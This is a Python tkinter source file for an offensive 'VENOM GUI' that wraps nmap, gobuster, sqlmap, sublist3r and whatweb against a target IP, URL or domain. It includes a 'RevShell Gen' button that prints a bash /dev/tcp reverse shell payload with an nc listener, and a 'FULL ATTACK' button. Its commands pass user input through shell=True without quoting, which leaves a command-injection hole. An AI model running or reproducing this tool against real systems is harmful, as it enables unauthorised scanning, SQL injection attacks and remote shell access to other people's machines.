#!/usr/bin/env python3
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import subprocess
import threading
import os
import sys
import time
from datetime import datetime

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
RESULTS_DIR = os.path.join(BASE_DIR, "results")
WORDLIST_DIR = os.path.join(BASE_DIR, "wordlists")
os.makedirs(RESULTS_DIR, exist_ok=True)
os.makedirs(WORDLIST_DIR, exist_ok=True)

def run_command(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
        return r.stdout + r.stderr
    except Exception as e:
        return str(e)

class VenomGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("VENOM GUI - Kalz Unbreakable Core")
        self.root.geometry("1200x700")
        self.root.configure(bg='#1a1a1a')
        self.target_ip = tk.StringVar()
        self.target_url = tk.StringVar()
        self.target_domain = tk.StringVar()
        self.lhost = tk.StringVar()
        self.lport = tk.StringVar()
        self.wordlist_path = tk.StringVar()
        self.setup_ui()

    def setup_ui(self):
        style = ttk.Style()
        style.theme_use('clam')
        header = tk.Label(self.root, text="[»kalz pro Active!!«]  VENOM GUI", fg="red", bg="black", font=('Courier', 16, 'bold'), pady=10)
        header.pack(fill=tk.X)
        main = ttk.Frame(self.root)
        main.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        left = ttk.LabelFrame(main, text="CONTROL", padding=10)
        left.pack(side=tk.LEFT, fill=tk.Y)
        ttk.Label(left, text="IP:").grid(row=0, column=0, sticky='w')
        tk.Entry(left, textvariable=self.target_ip, width=25, bg='#2d2d2d', fg='#00ff00').grid(row=0, column=1)
        ttk.Label(left, text="URL:").grid(row=1, column=0, sticky='w')
        tk.Entry(left, textvariable=self.target_url, width=25, bg='#2d2d2d', fg='#00ff00').grid(row=1, column=1)
        ttk.Label(left, text="Domain:").grid(row=2, column=0, sticky='w')
        tk.Entry(left, textvariable=self.target_domain, width=25, bg='#2d2d2d', fg='#00ff00').grid(row=2, column=1)
        ttk.Label(left, text="LHOST:").grid(row=3, column=0, sticky='w')
        tk.Entry(left, textvariable=self.lhost, width=25, bg='#2d2d2d', fg='#00ff00').grid(row=3, column=1)
        ttk.Label(left, text="LPORT:").grid(row=4, column=0, sticky='w')
        tk.Entry(left, textvariable=self.lport, width=25, bg='#2d2d2d', fg='#00ff00').grid(row=4, column=1)
        ttk.Button(left, text="Ping Sweep", command=self.ping).pack(fill=tk.X, pady=2)
        ttk.Button(left, text="Port Scan", command=self.portscan).pack(fill=tk.X, pady=2)
        ttk.Button(left, text="Dir Brute", command=self.dirbrute).pack(fill=tk.X, pady=2)
        ttk.Button(left, text="SQL Detect", command=self.sqldetect).pack(fill=tk.X, pady=2)
        ttk.Button(left, text="Subdomain", command=self.subdomain).pack(fill=tk.X, pady=2)
        ttk.Button(left, text="WhatWeb", command=self.whatweb).pack(fill=tk.X, pady=2)
        ttk.Button(left, text="Nmap Full", command=self.nmapfull).pack(fill=tk.X, pady=2)
        ttk.Button(left, text="RevShell Gen", command=self.revgen).pack(fill=tk.X, pady=2)
        ttk.Button(left, text="FULL ATTACK", command=self.fullattack).pack(fill=tk.X, pady=5)
        right = ttk.LabelFrame(main, text="OUTPUT", padding=5)
        right.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
        self.console = scrolledtext.ScrolledText(right, wrap=tk.WORD, bg='black', fg='#00ff00', font=('Courier', 9))
        self.console.pack(fill=tk.BOTH, expand=True)
        self.status = tk.Label(self.root, text="Ready", bd=1, relief=tk.SUNKEN, anchor='w', bg='black', fg='red')
        self.status.pack(side=tk.BOTTOM, fill=tk.X)

    def log(self, msg):
        self.console.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] {msg}\n")
        self.console.see(tk.END)
        self.root.update()

    def run_thread(self, target):
        threading.Thread(target=target, daemon=True).start()

    def ping(self):
        ip = self.target_ip.get()
        if not ip: return messagebox.showerror("Error", "IP required")
        self.log(f"[*] ping sweep on {ip}.0/24")
        def f():
            out = run_command(f"ping -c 1 -W 1 {ip}.1")
            self.log(out)
        self.run_thread(f)

    def portscan(self):
        ip = self.target_ip.get()
        if not ip: return
        self.log(f"[*] port scan {ip}")
        def f():
            out = run_command(f"nmap -p 1-1000 -T4 {ip}")
            self.log(out)
        self.run_thread(f)

    def dirbrute(self):
        url = self.target_url.get()
        if not url: return
        wl = os.path.join(WORDLIST_DIR, "dirs.txt")
        self.log(f"[*] dir brute {url}")
        def f():
            out = run_command(f"gobuster dir -u {url} -w {wl} -t 50")
            self.log(out)
        self.run_thread(f)

    def sqldetect(self):
        url = self.target_url.get()
        if not url: return
        self.log(f"[*] sqlmap on {url}")
        def f():
            out = run_command(f"sqlmap -u {url} --batch --level=3")
            self.log(out)
        self.run_thread(f)

    def subdomain(self):
        dom = self.target_domain.get()
        if not dom: return
        self.log(f"[*] sublist3r {dom}")
        def f():
            out = run_command(f"sublist3r -d {dom}")
            self.log(out)
        self.run_thread(f)

    def whatweb(self):
        url = self.target_url.get()
        if not url: return
        self.log(f"[*] whatweb {url}")
        def f():
            out = run_command(f"whatweb {url}")
            self.log(out)
        self.run_thread(f)

    def nmapfull(self):
        ip = self.target_ip.get()
        if not ip: return
        self.log(f"[*] nmap full {ip}")
        def f():
            out = run_command(f"nmap -sV -sC -p- -T4 {ip}")
            self.log(out)
        self.run_thread(f)

    def revgen(self):
        lh = self.lhost.get()
        lp = self.lport.get()
        if not lh or not lp: return
        payload = f"bash -i >& /dev/tcp/{lh}/{lp} 0>&1"
        self.log(f"[!] Payload: {payload}")
        self.log("[*] Listener: nc -lvnp " + lp)

    def fullattack(self):
        ip = self.target_ip.get()
        if not ip: return
        self.log("[!] starting full attack")
        def f():
            out = run_command(f"nmap -sV -p- -T4 {ip}")
            self.log(out)
            out2 = run_command(f"whatweb http://{ip}")
            self.log(out2)
            self.log("[+] full attack done")
        self.run_thread(f)

if __name__ == "__main__":
    root = tk.Tk()
    app = VenomGUI(root)
    root.mainloop()
